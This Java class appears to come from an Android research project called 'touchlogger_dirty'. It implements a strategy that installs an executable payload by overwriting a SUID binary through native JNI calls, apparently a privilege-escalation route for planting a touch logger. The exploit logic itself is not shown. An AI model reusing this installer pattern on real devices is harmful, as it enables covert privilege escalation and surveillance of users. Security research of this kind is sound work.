package org.leyfer.thesis.touchlogger_dirty.strategy.impl.dirty;

import android.content.Context;

import org.leyfer.thesis.touchlogger_dirty.strategy.IStrategy;
import org.leyfer.thesis.touchlogger_dirty.utils.JniApi;

/**
 * Created by k.leyfer on 11.10.2017.
 */

public class SuidBinaryOverwritingStrategy implements IStrategy {

    private final String execPayloadPath;
    private String suidBinaryPath = null;
    private final Context context;

    public SuidBinaryOverwritingStrategy(String execPayloadPath, Context context) {
        this.execPayloadPath = execPayloadPath;
        this.context = context;
    }

    @Override
    public String getTitle() {
        return null;
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public boolean installationIsPossible() {
        suidBinaryPath = JniApi.getSuidBinaryPath(execPayloadPath);
        return suidBinaryPath != null;
    }

    @Override
    public void installPayload() {
        JniApi.installPayloadThroughSuid(suidBinaryPath, context.getFilesDir().getAbsolutePath());
    }
}
